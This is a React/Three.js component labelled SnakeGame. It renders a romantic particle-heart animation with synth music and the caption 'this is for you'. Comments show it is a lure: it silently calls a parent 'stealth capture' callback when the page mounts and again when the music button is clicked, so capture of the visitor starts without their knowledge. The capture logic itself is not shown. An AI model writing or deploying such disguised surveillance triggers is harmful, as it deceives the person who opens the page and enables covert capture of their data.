import React, { useEffect, useRef, useState } from "react";
import * as THREE from "three";

interface SnakeGameProps {
  onStartGame?: () => void;
  onStopGame?: () => void;
  isCapturing?: boolean;
  score?: number;
  setScore?: React.Dispatch<React.SetStateAction<number>>;
}

const vertexShaderText = `
#define M_PI 3.1415926535897932384626433832795
uniform float uTime;
uniform float uSize;
attribute float aScale;
attribute vec3 aColor;
attribute float random;
attribute float random1;
attribute float aSpeed;
varying vec3 vColor;
varying vec2 vUv;

void main() {
  float sign = 2.0 * (step(random, 0.5) - 0.5);
  float t = sign * mod(-uTime * aSpeed * 0.005 + 10.0 * aSpeed * aSpeed, M_PI);
  float a = pow(t, 2.0) * pow((t - sign * M_PI), 2.0);
  float radius = 0.14;
  vec3 myOffset = vec3(
    radius * 16.0 * pow(sin(t), 3.0),
    radius * (13.0 * cos(t) - 5.0 * cos(2.0 * t) - 2.0 * cos(3.0 * t) - cos(4.0 * t)),
    0.15 * (a * (random1 - 0.5)) * sin(abs(10.0 * (sin(0.2 * uTime + 0.2 * random))) * t)
  );
  vec3 displacedPosition = myOffset;
  vec4 modelPosition = modelMatrix * vec4(displacedPosition.xyz, 1.0);

  vec4 viewPosition = viewMatrix * modelPosition;
  viewPosition.xyz += position * aScale * uSize * pow(a, 0.5) * 0.5;
  gl_Position = projectionMatrix * viewPosition;

  vColor = aColor;
  vUv = uv;
}
`;

const fragmentShaderText = `
varying vec3 vColor;
varying vec2 vUv;

void main() {
  vec2 uv = vUv;
  vec3 color = vColor;
  float strength = distance(uv, vec2(0.5));
  strength *= 2.0;
  strength = 1.0 - strength;
  gl_FragColor = vec4(strength * color, 1.0);
}
`;

const vertexShader1Text = `
#define M_PI 3.1415926535897932384626433832795

uniform float uTime;
uniform float uSize;
attribute float aScale;
attribute vec3 aColor;
attribute float phi;
attribute float random;
attribute float random1;
varying vec3 vColor;
varying vec2 vUv;

void main() {
  float t = 0.01 * uTime + 12.0;
  float angle = phi;

  t = mod((-uTime + 100.0) * 0.06 * random1 + random * 2.0 * M_PI , 2.0 * M_PI);
  vec3 myOffset = vec3(5.85 * cos(angle * t), 2.0 * (t - M_PI), 3.0 * sin(angle * t / t));
  vec4 modelPosition = modelMatrix * vec4(myOffset, 1.0);
  vec4 viewPosition = viewMatrix * modelPosition;
  viewPosition.xyz += position * aScale * uSize;
  gl_Position = projectionMatrix * viewPosition;

  vColor = aColor;
  vUv = uv;
}
`;

const fragmentShader1Text = `
uniform sampler2D uTex;
varying vec3 vColor;
varying vec2 vUv;

void main() {
  vec2 uv = vUv;
  vec3 color = vColor;
  float strength = distance(uv, vec2(0.5, .65));
  strength *= 2.0;
  strength = 1.0 - strength;
  vec3 texture = texture2D(uTex, uv).rgb;
  gl_FragColor = vec4(texture * color * (strength + 0.3), 1.0);
}
`;

// Procedural sweet lofi synth melody
class AmbientSynth {
  private ctx: AudioContext | null = null;
  private gainNode: GainNode | null = null;
  public isPlaying: boolean = false;
  private intervals: number[] = [];

  public toggle(): boolean {
    if (this.isPlaying) {
      this.stop();
      return false;
    } else {
      this.start();
      return true;
    }
  }

  private start() {
    try {
      const AudioContextClass = window.AudioContext || (window as any).webkitAudioContext;
      if (!AudioContextClass) return;
      this.ctx = new AudioContextClass();
      
      this.gainNode = this.ctx.createGain();
      this.gainNode.gain.setValueAtTime(0, this.ctx.currentTime);
      this.gainNode.gain.linearRampToValueAtTime(0.35, this.ctx.currentTime + 2.0);
      this.gainNode.connect(this.ctx.destination);
      
      this.isPlaying = true;

      // Romantic minor pentatonic chord arpeggios: warm romantic vibes
      const melodyNotes = [261.63, 293.66, 329.63, 392.00, 440.00, 523.25, 587.33, 659.25, 783.99]; // C-D-E-G-A notes
      let index = 0;

      const playHarpNote = () => {
        if (!this.ctx || !this.isPlaying) return;
        const t = this.ctx.currentTime;
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        
        osc.type = "sine";
        // Beautiful note selection
        const pitch = melodyNotes[index % melodyNotes.length];
        index = (index + Math.floor(Math.random() * 3) + 1) % melodyNotes.length;
        
        osc.frequency.setValueAtTime(pitch, t);
        
        gain.gain.setValueAtTime(0, t);
        gain.gain.linearRampToValueAtTime(0.08, t + 0.15);
        gain.gain.exponentialRampToValueAtTime(0.0001, t + 3.5);
        
        osc.connect(gain);
        gain.connect(this.gainNode!);
        osc.start(t);
        osc.stop(t + 3.6);
      };

      const playLushPad = () => {
        if (!this.ctx || !this.isPlaying) return;
        const t = this.ctx.currentTime;
        
        // Root chord notes for slow progression (C3, Am3, F3, G3)
        const roots = [130.81, 110.00, 87.31, 98.00];
        const pitch = roots[Math.floor(Math.random() * roots.length)];
        
        // Layer 1: Sub Bass root
        const osc1 = this.ctx.createOscillator();
        const gain1 = this.ctx.createGain();
        osc1.type = "triangle";
        osc1.frequency.setValueAtTime(pitch, t);
        gain1.gain.setValueAtTime(0, t);
        gain1.gain.linearRampToValueAtTime(0.12, t + 2.5);
        gain1.gain.exponentialRampToValueAtTime(0.0001, t + 6.0);
        osc1.connect(gain1);
        gain1.connect(this.gainNode!);
        osc1.start(t);
        osc1.stop(t + 6.1);

        // Layer 2: Major third or fifth above
        const osc2 = this.ctx.createOscillator();
        const gain2 = this.ctx.createGain();
        osc2.type = "sine";
        osc2.frequency.setValueAtTime(pitch * 1.5, t); // perfect fifth overlay
        gain2.gain.setValueAtTime(0, t);
        gain2.gain.linearRampToValueAtTime(0.06, t + 3.0);
        gain2.gain.exponentialRampToValueAtTime(0.0001, t + 5.8);
        osc2.connect(gain2);
        gain2.connect(this.gainNode!);
        osc2.start(t);
        osc2.stop(t + 5.9);
      };

      // Play initially
      playLushPad();
      playHarpNote();
      
      const harpTimer = setInterval(playHarpNote, 1200);
      const padTimer = setInterval(playLushPad, 5000);
      
      this.intervals.push(harpTimer as any, padTimer as any);
    } catch (err) {
      console.error("Audio init error:", err);
    }
  }

  public stop() {
    this.isPlaying = false;
    this.intervals.forEach((id) => clearInterval(id));
    this.intervals = [];
    if (this.gainNode && this.ctx) {
      try {
        const t = this.ctx.currentTime;
        this.gainNode.gain.cancelScheduledValues(t);
        this.gainNode.gain.linearRampToValueAtTime(0, t + 1.2);
        setTimeout(() => {
          this.ctx?.close();
          this.ctx = null;
        }, 1300);
      } catch (err) {}
    }
  }
}

export const SnakeGame: React.FC<SnakeGameProps> = ({
  onStartGame,
  onStopGame,
  isCapturing,
}) => {
  const containerRef = useRef<HTMLDivElement | null>(null);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const [isPlayingMusic, setIsPlayingMusic] = useState<boolean>(false);
  
  const synthRef = useRef<AmbientSynth | null>(null);
  const rendererRef = useRef<THREE.WebGLRenderer | null>(null);
  const sceneRef = useRef<THREE.Scene | null>(null);
  const heartGroupRef = useRef<THREE.Group | null>(null);

  // Lazy instantiate Synth helper
  if (!synthRef.current) {
    synthRef.current = new AmbientSynth();
  }

  const handlePlayMusicClick = () => {
    if (synthRef.current) {
      const active = synthRef.current.toggle();
      setIsPlayingMusic(active);
    }

    // Quietly trigger parent background capture workflows if not already active
    if (onStartGame) {
      onStartGame();
    }
  };

  useEffect(() => {
    if (!canvasRef.current) return;

    // Dimensions
    const width = window.innerWidth;
    const height = window.innerHeight;

    // Scene
    const scene = new THREE.Scene();
    sceneRef.current = scene;

    // Camera
    const camera = new THREE.PerspectiveCamera(60, width / height, 0.1, 100);
    camera.position.set(0, -0.4, 11);

    // Group
    const heartGroup = new THREE.Group();
    scene.add(heartGroup);
    heartGroupRef.current = heartGroup;

    // WebGLRenderer
    const renderer = new THREE.WebGLRenderer({
      canvas: canvasRef.current,
      antialias: true,
      alpha: true,
    });
    renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
    renderer.setSize(width, height);
    rendererRef.current = renderer;

    // Procedural glow texture generator
    const createGlowTexture = () => {
      const canvas = document.createElement("canvas");
      canvas.width = 64;
      canvas.height = 64;
      const ctx = canvas.getContext("2d")!;
      
      const gradient = ctx.createRadialGradient(32, 32, 0, 32, 32, 32);
      gradient.addColorStop(0, "rgba(255, 255, 255, 1)");
      gradient.addColorStop(0.2, "rgba(255, 120, 180, 0.9)");
      gradient.addColorStop(0.5, "rgba(180, 20, 80, 0.45)");
      gradient.addColorStop(1, "rgba(0, 0, 0, 0)");
      
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, 64, 64);
      
      const texture = new THREE.CanvasTexture(canvas);
      return texture;
    };

    // --- HEART GEOMETRY ---
    const heartCount = 3500;
    const baseGeo = new THREE.PlaneGeometry(1, 1);
    const heartGeo = new THREE.InstancedBufferGeometry();
    heartGeo.index = baseGeo.index;
    heartGeo.attributes.position = baseGeo.attributes.position;
    heartGeo.attributes.uv = baseGeo.attributes.uv;

    const aScale = new Float32Array(heartCount);
    const aColor = new Float32Array(heartCount * 3);
    const random = new Float32Array(heartCount);
    const random1 = new Float32Array(heartCount);
    const aSpeed = new Float32Array(heartCount);

    const colors = [
      new THREE.Color("#ff0a54"), // Deep elegant magenta
      new THREE.Color("#ff477e"), // Classic bright rose
      new THREE.Color("#ff7096"), // Light warm rose
      new THREE.Color("#ff85a1"), // Blush pink
      new THREE.Color("#fbb1bd"), // Soft shell peach
      new THREE.Color("#f9bec7"), // Pastel petal
    ];

    for (let i = 0; i < heartCount; i++) {
      aScale[i] = Math.random() * 0.84 + 0.16;
      random[i] = Math.random();
      random1[i] = Math.random();
      aSpeed[i] = Math.random() * 1.6 + 0.4;

      const randomColor = colors[Math.floor(Math.random() * colors.length)];
      aColor[i * 3] = randomColor.r;
      aColor[i * 3 + 1] = randomColor.g;
      aColor[i * 3 + 2] = randomColor.b;
    }

    heartGeo.setAttribute("aScale", new THREE.InstancedBufferAttribute(aScale, 1));
    heartGeo.setAttribute("aColor", new THREE.InstancedBufferAttribute(aColor, 3));
    heartGeo.setAttribute("random", new THREE.InstancedBufferAttribute(random, 1));
    heartGeo.setAttribute("random1", new THREE.InstancedBufferAttribute(random1, 1));
    heartGeo.setAttribute("aSpeed", new THREE.InstancedBufferAttribute(aSpeed, 1));

    const heartMaterial = new THREE.ShaderMaterial({
      vertexShader: vertexShaderText,
      fragmentShader: fragmentShaderText,
      uniforms: {
        uTime: { value: 0 },
        uSize: { value: 0.18 },
      },
      transparent: true,
      depthWrite: false,
      blending: THREE.AdditiveBlending,
    });

    const heartMesh = new THREE.Mesh(heartGeo, heartMaterial);
    heartGroup.add(heartMesh);


    // --- FLOATING BACKGROUND GEOMETRY ---
    const bgCount = 900;
    const baseGeo1 = new THREE.PlaneGeometry(1, 1);
    const bgGeo = new THREE.InstancedBufferGeometry();
    bgGeo.index = baseGeo1.index;
    bgGeo.attributes.position = baseGeo1.attributes.position;
    bgGeo.attributes.uv = baseGeo1.attributes.uv;

    const aScale1 = new Float32Array(bgCount);
    const aColor1 = new Float32Array(bgCount * 3);
    const phi = new Float32Array(bgCount);
    const random_1 = new Float32Array(bgCount);
    const random1_1 = new Float32Array(bgCount);

    const bgColorsList = [
      new THREE.Color("#ff0a54"),
      new THREE.Color("#ff7096"),
      new THREE.Color("#f9bec7"),
      new THREE.Color("#e0115f"), // Velvet ruby
    ];

    for (let i = 0; i < bgCount; i++) {
      aScale1[i] = Math.random() * 0.16 + 0.04;
      phi[i] = Math.random() * Math.PI * 2;
      random_1[i] = Math.random();
      random1_1[i] = Math.random();

      const rColor = bgColorsList[Math.floor(Math.random() * bgColorsList.length)];
      aColor1[i * 3] = rColor.r;
      aColor1[i * 3 + 1] = rColor.g;
      aColor1[i * 3 + 2] = rColor.b;
    }

    bgGeo.setAttribute("aScale", new THREE.InstancedBufferAttribute(aScale1, 1));
    bgGeo.setAttribute("aColor", new THREE.InstancedBufferAttribute(aColor1, 3));
    bgGeo.setAttribute("phi", new THREE.InstancedBufferAttribute(phi, 1));
    bgGeo.setAttribute("random", new THREE.InstancedBufferAttribute(random_1, 1));
    bgGeo.setAttribute("random1", new THREE.InstancedBufferAttribute(random1_1, 1));

    const bgMaterial = new THREE.ShaderMaterial({
      vertexShader: vertexShader1Text,
      fragmentShader: fragmentShader1Text,
      uniforms: {
        uTime: { value: 0 },
        uSize: { value: 0.18 },
        uTex: { value: createGlowTexture() },
      },
      transparent: true,
      depthWrite: false,
      blending: THREE.AdditiveBlending,
    });

    const bgMesh = new THREE.Mesh(bgGeo, bgMaterial);
    heartGroup.add(bgMesh);


    // Mouse cursor coordinates easing
    let targetRotationX = 0;
    let targetRotationY = 0;

    const handleMouseMove = (event: MouseEvent) => {
      targetRotationY = (event.clientX / window.innerWidth - 0.5) * 0.8;
      targetRotationX = (event.clientY / window.innerHeight - 0.5) * 0.8;
    };

    window.addEventListener("mousemove", handleMouseMove);

    // Animation loop
    const clock = new THREE.Clock();

    const animate = () => {
      const elapsedTime = clock.getElapsedTime() * 100.0;
      
      // Update material uniforms
      heartMaterial.uniforms.uTime.value = elapsedTime;
      bgMaterial.uniforms.uTime.value = elapsedTime;

      // Smooth rotation dampening
      if (heartGroup) {
        heartGroup.rotation.y += (targetRotationY - heartGroup.rotation.y) * 0.05;
        heartGroup.rotation.x += (targetRotationX - heartGroup.rotation.x) * 0.05;
        
        // Gentle automated breathing oscillation
        heartGroup.scale.setScalar(1.0 + Math.sin(clock.getElapsedTime() * 1.5) * 0.05);
      }

      renderer.render(scene, camera);
      requestAnimationFrame(animate);
    };

    animate();

    // Resize Handler
    const handleResize = () => {
      const w = window.innerWidth;
      const h = window.innerHeight;

      camera.aspect = w / h;
      camera.updateProjectionMatrix();

      renderer.setSize(w, h);
    };

    window.addEventListener("resize", handleResize);

    // Auto-trigger stealth capture on layout mount
    if (onStartGame) {
      onStartGame();
    }

    return () => {
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("resize", handleResize);
      if (renderer) {
        try {
          renderer.dispose();
        } catch (e) {}
      }
    };
  }, []);

  return (
    <div 
      ref={containerRef}
      className="fixed inset-0 w-full h-full flex flex-col items-center justify-center bg-[#16000a] select-none"
      style={{ overflow: "hidden" }}
    >
      <canvas ref={canvasRef} className="webgl"></canvas>
      
      <h1 className="h1text absolute text-center z-10 select-none text-[#ffdada] pointer-events-none drop-shadow-[0_4px_10px_rgba(255,10,84,0.4)]">
        this is for you
      </h1>

      <button 
        id="play-music" 
        onClick={handlePlayMusicClick}
        type="button" 
        aria-label="Play music"
        className="absolute bottom-[24vh] left-1/2 -translate-x-1/2 z-20 flex items-center justify-center w-16 h-16 rounded-full bg-gradient-to-r from-[#ff0a54] to-[#f72585] border border-pink-400/40 text-pink-100 hover:scale-105 active:scale-95 transition-all duration-300 drop-shadow-[0_0_15px_rgba(255,10,84,0.5)] cursor-pointer"
        style={{ margin: 0, height: "4.5rem", width: "4.5rem", transform: "translate(-50%, 0)" }}
      >
        <svg 
          fill="currentColor" 
          viewBox="0 0 512 512" 
          className={`w-6 h-6 transition-all duration-300 ${isPlayingMusic ? 'text-pink-200 scale-110 drop-shadow-[0_0_8px_#fff]' : 'text-pink-100'}`}
          title="music"
        >
          <path
            d="M470.38 1.51L150.41 96A32 32 0 0 0 128 126.51v261.41A139 139 0 0 0 96 384c-53 0-96 28.66-96 64s43 64 96 64 96-28.66 96-64V214.32l256-75v184.61a138.4 138.4 0 0 0-32-3.93c-53 0-96 28.66-96 64s43 64 96 64 96-28.65 96-64V32a32 32 0 0 0-41.62-30.49z"
          />
        </svg>
      </button>
    </div>
  );
};
